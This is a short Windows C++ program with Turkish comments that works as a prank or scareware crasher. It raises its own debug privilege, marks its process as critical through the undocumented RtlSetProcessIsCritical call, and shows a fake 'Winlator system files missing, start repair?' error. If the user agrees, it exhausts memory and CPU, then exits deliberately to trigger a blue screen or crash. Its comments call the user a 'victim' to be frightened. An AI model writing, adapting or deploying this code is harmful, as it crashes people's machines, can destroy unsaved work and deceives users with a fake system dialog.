#include <windows.h>
#include <vector>
#include <iostream>

// Windows'un gizli fonksiyonu: Süreci "kritik" olarak işaretler.
typedef NTSTATUS (NTAPI *pfnRtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedPrivilege);

// Sistemi yavaşlatmak için RAM ve CPU tüketen fonksiyon
DWORD WINAPI KaynakSömür(LPVOID lpParam) {
    std::vector<void*> bellek;
    while (true) {
        void* p = malloc(1024 * 512); // Her adımda 512KB ayır
        if (p) bellek.push_back(p);
        // Boş döngü ile CPU'yu %100'e zorla
        for (volatile int i = 0; i < 1000000; i++); 
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 1. AYRICALIKLARI YÜKSELT (Kritik işlem yapabilmek için şart)
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }

    // 2. KRİTİK İŞARETLEME (BSOD Hazırlığı)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        auto RtlSetProcessIsCritical = (pfnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            // Sistemi kandır: "Ben ölürsem sistem de ölür" de.
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
    }

    // 3. KULLANICI ETKİLEŞİMİ VE ÇÖKERTME
    int secim = MessageBoxA(NULL, 
        "Winlator sistem dosyaları eksik! Onarım başlatılsın mı?\n(Bu işlem sistemin donmasına neden olabilir)", 
        "Sistem Hatası", 
        MB_YESNO | MB_ICONSTOP);

    if (secim == IDYES) {
        // Arka planda kaynakları tüketmeye başla (Donma hissi verir)
        CreateThread(NULL, 0, KaynakSömür, NULL, 0, NULL);
        
        Sleep(3000); // 3 saniye bekle (Kurbanın korkması için süre)
        
        // PROGRAMI KAPAT: Kritik süreç olduğu için Winlator BSOD verecek veya kapanacaktır.
        exit(0); 
    }

    return 0;
}

